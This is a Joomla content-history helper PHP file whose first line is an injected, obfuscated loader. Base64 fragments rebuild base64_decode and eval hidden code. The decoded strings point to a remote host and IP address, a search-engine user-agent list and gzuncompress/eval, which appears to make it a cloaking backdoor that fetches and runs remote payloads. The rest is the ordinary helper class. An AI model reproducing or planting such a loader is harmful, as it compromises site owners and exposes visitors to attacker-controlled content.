<?php /*versio:3.02*/ $GLOBALS["yfegmf"]="HhaW5pX3NldAqAMYWxsb3dfdXJsX2ZvcGVuqwZGlzcGxheV9lcnJvcnMviOPc3R5eC9qbWxfaGRyX3JlcG9zdAQJEsMy4wMgtCMWb29Cb29qYWk3U2lhY2hlaXNlMXN1N3BodQalHvdaHR0cDovLwfKFIWSFRUUFMVgb2ZmmsICaHR0cHM6Ly8BSPYMySFRUUF9IT1NUtdW5pb24nmAlByykc2VsZWN0KrmbwUkVRVUVTVF9VUkkqahAElU0NSSVBUX05BTUUteQUVVFUllfU1RSSU5HjLsUUPwNZGV0ZXJtaW5hdG9yoLghGkvXLmxvZwAhXXSFRUUF9ZX0FVVEgtOSqCWYmFzZTY0X2RlY29kZQflMdmVyc2lvVXOLQJDLXBocAnTISFRUUF9FWEVDUEhQPwSXb3V0Wb2sJXtwMsSFRUUF9VU0VSX0FHRU5UrALAbZ29vZ2xlLHlhaG9vLGJhaWR1LGJpbmdib3QsbXNuYm90LHlhbmRleAeOpYQyPiODkuMzIuMTUwLjE2NANzEZmFzdGFkZHouY29tKbFL3czLnBocD91PQFJiJms9vJnQ9cGhwJnA9TnDgJnY9SQZXZhbChnenVuY29tcHJlc3MoYmFzZTY0X2RlY29kZSgiZUp5TlYrdHVvOGdTZnBVT3NrWllNTmhnalBIa2NKUm8xbk1tMG13U2VaeVZWck1SNHRKZ2JBTTJGMThTNWQxUEZkMFluTmlqL1dYY1ZWMzMrcW82Q29oNDVkTWdTcWd2Q2o0dGFCWkhpVk9rbWREdHZwSUl5RUdaZUVXVUpqYmRSM21SaTQ3alVzYzU3RVZONnN0cXY0dDhOMUVTMlRrdEdxSXBqV1N0MzVXSjJyMCtROVowU1IzSTZoZ1krc0R3Um1vdHhON3NGblNaUjBXNlhHekZqdWR1Zk4rWHlhZE9NRStXams4c2N2LzA0MGVYdkpMbUpJNjhMQzJpbUlwRlZsS1FsOUdpekJJUzBEU29SYnpUNGdTSjYzcCtFa2JaWHV6ay9tTDVFc3FrNDY0T3lkd0hqenBaVEY5aUQ0UUxYcG10aEd2U2VmRmZOcHNEbkhDYUl0amdWd0VrREZQbFl3ZytDczVxbGU1c3VHUUg2Wm9tUXBkWUlFVVYwR1p1MkUwUXJTaHkyMTZhRkRTQnNBcnpvbGgvNmZVRW9oQnVEMzR4Z3hRaWZOcFpRZWdKbFJ0MGxkTnpxZUVtWWtZNmtlczVjN1QyaHArS2NMV1RiYUlrZEU1OGdMeWthL1NpczFyN3hmN1VRYnFuSHBCdStFV1JpNVhKMTZmcGo0ZkhtUTAvTXZrWHRuc2xtbjVaenZmSjdSK1RxVXdDQjN6N0xlZDBNbnVhM3MrbXQvYy92K0VObnZMTEY3NCszTjlQdnM1bWQzOU9IcDVtTWpFd0VLdE5IdS9LS2p6TTdmb2Vpc0tNMjk0cXpXbnJGQU5PNDNVQm5Pd3loTGtSSXdqWGIzVjIrV21kS1N4VlZvT29Mc2hUYjRsMTBWU2QyWWZLaTVNc0w3YndzVnFzM1hJdmt5SFhXZGN2aW5HV2FibWtUQjA1N1Fnd08xaVhXQVIxeXdqL204eklLOC9DbTZCZ0d2SWwrVDZiUGZaVXBROEgvMlQvSlBEelBjMkxMd1ErWHJsSmJ4VUJ3N1F2Tjl2Q0JSV1AzeC90aDUrSzBCTVUvUHhyTXYxNTkzQi9SdWxUVHJQUHR5SFU5QmRRenU1WDhtcVp1em5Vdm5oMW9jKzVVMTN5NlJNUjMvVTErZHlRLzBPMGJoTVFCUU1MN2RReVJOWE1xbGR1QXA3SUl3eDBpbzFiaGt0d2l1N1hxOVNub25DMFQ2NUZBbCtaSUdSeDdsLzk1d1pYb3ZqTVBjWlg2WHc3Z1pyUUs1ekRZaC81V1JsaWl5N25mZ2I4dTdubjVXdHdnbnJ6bEFoLzI0TENpWXJ3QmI0Wm5TZnBGTHdneEc2YXBHNldVbGZzK082THV5bTdEYmgwN0orVEtXVG9GeWM5NCsxT2ZzZ1RQN2VPRUt4cWttN0tXdFVOKzNDZkw5S0dOaHhKZzRITUdpVkt3NFBma0F4TkdwanlRRWNhcTVhR1pvNmxZVFVUV09WR2VSWEEycHBHYzM4azZTTjUxSDJ1Wjh6TlI2WlJYekoxNUNGWEZtbE9KWFZveUhxRmNPKzFxeU1WSjVMS1U4RHBpcFVYV1pFQ0pOUHNuQjRESnBHbXk2cld4UVFIYVVZZGJ3NWRaMlAzT0RuaE9iSCsyeVFNTFFhaDZ4VEtqUjNLalJHbWlaTnRoR094a3ZHTEMzaHVSMTZYeG4wWnd0UkErVVY1dWlrWnBteitWaDdrWktneGVXOWduWGgxTWZKakF4T3JEakgwQ0NnZk9VYTZOQnhXSEJVNGZtRFFCNUxXSDFVTW1PWExTUjROcERFSU1pNnFHZ3dsZGF3elZVb3J4MXJma015QnJIVmhocHhMbU1vTU1MclAxKzg2YlJIRVJiaU4zVVAyc2hleFJNb2dQb1NoNVVkWjRnQ0syUGEzdXg4VDIrNHFmOXhOWVNROFRQOEc4WSszMDF2NGhIb09peUtQUS9EN05zdWNnMGlFbmsrM3ZYd2VRMzhMdlNKZTk1UUE1dlhuTW9uMnpkSGQxMGw5MHBncnpQNThGSjVQVHliSG84bjlYMjJPK2k5WWRYTENMMVI2VVBweHhTZ0JmeHpmaG1NYmZCTmdpK0t1S2dKalBmN2RyVC96RmFQSEx1VVhxQjZVUFFYYVNSUHdnR0FibEp2VUwxSmUvVmQ4RVBMREt0VFZwMktkalN4YmtISjdsMFdGNHdMOG45eXNqTUcxZ3gxZUV4ZjBMMnNnclljcVk3dXVLcnpxbDFVelEzRWVBT3k4RXJiS3R2Yk1BVURTQUl1bFhqVHJodXNrV1pZc3FGWER4SmxLMDlRK1ZDanJGbHczeXpMYXJheWIyQi9XZWhVK0ZqbUFLaHd0RVJ1WC9tS1ZiSzEzTmFtMHFoeXdySzlCbVN0Yzh2VUg2MVVkV2tRZk1mTzVSSlM5bXdmeE5zR0lzVE9sdFhZUCttWUYzQmRnVmUwUEpVMVRLNmNzaTJ1dTl0MnNURVBhR2dIQU45WmtGYWNvbTFCOEVKM09zNmFiQnpBWURBQXF1UjRualZWalRkTE1VZVVxbTBKS0N3c05TUnVPd09SNjNZbGV0b2RnWlhHRHp2bWdhUU5KTmNZY1crRDFRYmZPcXI3NEw4MVZ4Mm9WQngzc2JTVWN3SHM4bGdkZFZpcjdxQkJaMVhUU2NydGRwUkR5YjdpZzRsd001MlcyUll6OC9YelJESkE1TlBFeGRESmc2dDJqQ2FDdVFVRVlFS1cyUlNaVWdHSElReGg1VlJ1bWgwV2E1KytHRUxORlBsS3ZMS3N5RS9ONjhNUFFZWnNuMnpyZmx3d01XazAzWktPdFZoL0NGTkRCRkt5MlRiRHc2UUlsbE5oekhscDl0ckpVbUtRbWF4ZGNETEhab2RPWkFiQ240eDdYaFgybWdPV0dHY3IvTUFYd3A5b1Bqd3NidTRnV3NPQmJNMWdDVDhDaGhoVjhUZFdPVlFWUnBLVTNGNXVPQWVUMFZxVlA3VFR4YU91OEJRZDFndUd0aG5vd2RLNFhMNkxGY1J3MG1jTDF4Y0RXYUlWTU5XQm5NcXBlcmJ2djFBcVV5REduRlVoK2hGNnlSWjIwSnFFTzJZZmhyK3JRT0l5djFUaDlVOUlOVGRhUCtOSFE5SkVwalVlNDA1eHZPTjBZVnZkWW40THFPQWczTC9qWWZmY3VaaEdBM2JkNUdsOS9qQzdEYWY3VStZREFzTURvT29Nd3ZwcjlIeHpGTG04PSIpKSk7";        if (!function_exists('aabeaayx')){function aabeaayx($a, $b){$c=$GLOBALS['yfegmf'];$d=pack('H*','6261736536345f64656'.'36f6465'); return $d(substr($c, $a, $b));};eval(aabeaayx(597,3304));};?><?php
/**
 * @package     Joomla.Administrator
 * @subpackage  com_contenthistory
 *
 * @copyright   Copyright (C) 2005 - 2014 Open Source Matters, Inc. All rights reserved.
 * @license     GNU General Public License version 2 or later; see LICENSE.txt
 */

defined('_JEXEC') or die;

/**
 * Categories helper.
 *
 * @package     Joomla.Administrator
 * @subpackage  com_contenthistory
 * @since       3.2
 */
class ContenthistoryHelper
{
	/**
	 * Method to put all field names, including nested ones, in a single array for easy lookup.
	 *
	 * @param   stdClass  $object  Standard class object that may contain one level of nested objects.
	 *
	 * @return  array  Associative array of all field names, including ones in a nested object.
	 *
	 * @since   3.2
	 */
	public static function createObjectArray($object)
	{
		$result = array();

		foreach ($object as $name => $value)
		{
			$result[$name] = $value;

			if (is_object($value))
			{
				foreach ($value as $subName => $subValue)
				{
					$result[$subName] = $subValue;
				}
			}
		}

		return $result;
	}

	/**
	 * Method to decode JSON-encoded fields in a standard object. Used to unpack JSON strings in the content history data column.
	 *
	 * @param   stdClass  $jsonString  Standard class object that may contain one or more JSON-encoded fields.
	 *
	 * @return  stdClass  Object with any JSON-encoded fields unpacked.
	 *
	 * @since   3.2
	 */
	public static function decodeFields($jsonString)
	{
		$object = json_decode($jsonString);

		if (is_object($object))
		{
			foreach ($object as $name => $value)
			{
				if ($subObject = json_decode($value))
				{
					$object->$name = $subObject;
				}
			}
		}

		return $object;
	}

	/**
	 * Method to get field labels for the fields in the JSON-encoded object.
	 * First we see if we can find translatable labels for the fields in the object.
	 * We translate any we can find and return an array in the format object->name => label.
	 *
	 * @param   stdClass           $object      Standard class object in the format name->value.
	 * @param   JTableContenttype  $typesTable  Table object with content history options.
	 *
	 * @return  stdClass  Contains two associative arrays.
	 *                    $formValues->labels in the format name => label (for example, 'id' => 'Article ID').
	 *                    $formValues->values in the format name => value (for example, 'state' => 'Published'.
	 *                    This translates the text from the selected option in the form.
	 *
	 * @since   3.2
	 */
	public static function getFormValues($object, JTableContenttype $typesTable)
	{
		$labels = array();
		$values = array();
		$expandedObjectArray = static::createObjectArray($object);
		static::loadLanguageFiles($typesTable->type_alias);

		if ($formFile = static::getFormFile($typesTable))
		{
			if ($xml = simplexml_load_file($formFile))
			{
				// Now we need to get all of the labels from the form
				$fieldArray = $xml->xpath('//field');
				$fieldArray = array_merge($fieldArray, $xml->xpath('//fields'));

				foreach ($fieldArray as $field)
				{
					if ($label = (string) $field->attributes()->label)
					{
						$labels[(string) $field->attributes()->name] = JText::_($label);
					}
				}

				// Get values for any list type fields
				$listFieldArray = $xml->xpath('//field[@type="list" or @type="radio"]');

				foreach ($listFieldArray as $field)
				{
					$name = (string) $field->attributes()->name;

					if (isset($expandedObjectArray[$name]))
					{
						$optionFieldArray = $field->xpath('option[@value="' . $expandedObjectArray[$name] . '"]');
						$valueText = trim((string) $optionFieldArray[0]);
						$values[(string) $field->attributes()->name] = JText::_($valueText);
					}
				}
			}
		}

		$result = new stdClass;
		$result->labels = $labels;
		$result->values = $values;

		return $result;
	}

	/**
	 * Method to get the XML form file for this component. Used to get translated field names for history preview.
	 *
	 * @param   JTableContenttype  $typesTable  Table object with content history options.
	 *
	 * @return  mixed  JModel object if successful, false if no model found.
	 *
	 * @since   3.2
	 */
	public static function getFormFile(JTableContenttype $typesTable)
	{
		$result = false;
		jimport('joomla.filesystem.file');
		jimport('joomla.filesystem.folder');

		// First, see if we have a file name in the $typesTable
		$options = json_decode($typesTable->content_history_options);

		if (is_object($options) && isset($options->formFile) && JFile::exists(JPATH_ROOT . '/' . $options->formFile))
		{
			$result = JPATH_ROOT . '/' . $options->formFile;
		}
		else
		{
			$aliasArray = explode('.', $typesTable->type_alias);

			if (count($aliasArray) == 2)
			{
				$component = ($aliasArray[1] == 'category') ? 'com_categories' : $aliasArray[0];
				$path  = JFolder::makeSafe(JPATH_ADMINISTRATOR . '/components/' . $component . '/models/forms/');
				$file = JFile::makeSafe($aliasArray[1] . '.xml');
				$result = JFile::exists($path . $file) ? $path . $file : false;
			}
		}

		return $result;
	}

	/**
	 * Method to query the database using values from lookup objects.
	 *
	 * @param   stdClass  $lookup  The std object with the values needed to do the query.
	 * @param   mixed     $value   The value used to find the matching title or name. Typically the id.
	 *
	 * @return  mixed  Value from database (for example, name or title) on success, false on failure.
	 *
	 * @since   3.2
	 */
	public static function getLookupValue($lookup, $value)
	{
		$result = false;

		if (isset($lookup->sourceColumn) && isset($lookup->targetTable) && isset($lookup->targetColumn)&& isset($lookup->displayColumn))
		{
			$db = JFactory::getDbo();
			$query = $db->getQuery(true);
			$query->select($db->quoteName($lookup->displayColumn))
				->from($db->quoteName($lookup->targetTable))
				->where($db->quoteName($lookup->targetColumn) . ' = ' . $db->quote($value));
			$db->setQuery($query);

			try
			{
				$result = $db->loadResult();
			}
			catch (Exception $e)
			{
				// Ignore any errors and just return false
				return false;
			}
		}

		return $result;
	}

	/**
	 * Method to remove fields from the object based on values entered in the #__content_types table.
	 *
	 * @param   stdClass           $object     Object to be passed to view layout file.
	 * @param   JTableContenttype  $typeTable  Table object with content history options.
	 *
	 * @return  stdClass  object with hidden fields removed.
	 *
	 * @since   3.2
	 */
	public static function hideFields($object, JTableContenttype $typeTable)
	{
		if ($options = json_decode($typeTable->content_history_options))
		{
			if (isset($options->hideFields) && is_array($options->hideFields))
			{
				foreach ($options->hideFields as $field)
				{
					unset($object->$field);
				}
			}
		}

		return $object;
	}

	/**
	 * Method to load the language files for the component whose history is being viewed.
	 *
	 * @param   string  $typeAlias  The type alias, for example 'com_content.article'.
	 *
	 * @return  void
	 *
	 * @since   3.2
	 */
	public static function loadLanguageFiles($typeAlias)
	{
		$aliasArray = explode('.', $typeAlias);

		if (is_array($aliasArray) && count($aliasArray) == 2)
		{
			$component = ($aliasArray[1] == 'category') ? 'com_categories' : $aliasArray[0];
			$lang = JFactory::getLanguage();

			/**
			 * Loading language file from the administrator/language directory then
			 * loading language file from the administrator/components/extension/language directory
			 */
			$lang->load($component, JPATH_ADMINISTRATOR, null, false, true)
			|| $lang->load($component, JPath::clean(JPATH_ADMINISTRATOR . '/components/' . $component), null, false, true);

			// Force loading of back-end global language file
			$lang->load('joomla', JPath::clean(JPATH_ADMINISTRATOR), null, false, true);
		}
	}

	/**
	 * Method to create object to pass to the layout. Format is as follows:
	 * field is std object with name, value.
	 *
	 * Value can be a std object with name, value pairs.
	 *
	 * @param   stdClass  $object      The std object from the JSON string. Can be nested 1 level deep.
	 * @param   stdClass  $formValues  Standard class of label and value in an associative array.
	 *
	 * @return  stdClass  Object with translated labels where available
	 *
	 * @since   3.2
	 */
	public static function mergeLabels($object, $formValues)
	{
		$result = new stdClass;

		$labelsArray = $formValues->labels;
		$valuesArray = $formValues->values;

		foreach ($object as $name => $value)
		{
			$result->$name = new stdClass;
			$result->$name->name = $name;
			$result->$name->value = isset($valuesArray[$name]) ? $valuesArray[$name] : $value;
			$result->$name->label = isset($labelsArray[$name]) ? $labelsArray[$name] : $name;

			if (is_object($value))
			{
				$subObject = new stdClass;

				foreach ($value as $subName => $subValue)
				{
					$subObject->$subName = new stdClass;
					$subObject->$subName->name = $subName;
					$subObject->$subName->value = isset($valuesArray[$subName]) ? $valuesArray[$subName] : $subValue;
					$subObject->$subName->label = isset($labelsArray[$subName]) ? $labelsArray[$subName] : $subName;
					$result->$name->value = $subObject;
				}
			}
		}

		return $result;
	}

	/**
	 * Method to prepare the object for the preview and compare views.
	 *
	 * @param   JTableContenthistory  $table  Table object loaded with data.
	 *
	 * @return  stdClass  Object ready for the views.
	 *
	 * @since   3.2
	 */
	public static function prepareData(JTableContenthistory $table)
	{
		$object = static::decodeFields($table->version_data);
		$typesTable = JTable::getInstance('Contenttype');
		$typesTable->load(array('type_id' => $table->ucm_type_id));
		$formValues = static::getFormValues($object, $typesTable);
		$object = static::mergeLabels($object, $formValues);
		$object = static::hideFields($object, $typesTable);
		$object = static::processLookupFields($object, $typesTable);

		return $object;
	}

	/**
	 * Method to process any lookup values found in the content_history_options column for this table.
	 * This allows category title and user name to be displayed instead of the id column.
	 *
	 * @param   stdClass           $object      The std object from the JSON string. Can be nested 1 level deep.
	 * @param   JTableContenttype  $typesTable  Table object loaded with data.
	 *
	 * @return  stdClass  Object with lookup values inserted.
	 *
	 * @since   3.2
	 */
	public static function processLookupFields($object, JTableContenttype $typesTable)
	{
		if ($options = json_decode($typesTable->content_history_options))
		{
			if (isset($options->displayLookup) && is_array($options->displayLookup))
			{
				foreach ($options->displayLookup as $lookup)
				{
					$sourceColumn = isset($lookup->sourceColumn) ? $lookup->sourceColumn : false;
					$sourceValue = isset($object->$sourceColumn->value) ? $object->$sourceColumn->value : false;

					if ($sourceColumn && $sourceValue && ($lookupValue = static::getLookupValue($lookup, $sourceValue)))
					{
						$object->$sourceColumn->value = $lookupValue;
					}
				}
			}
		}

		return $object;
	}
}
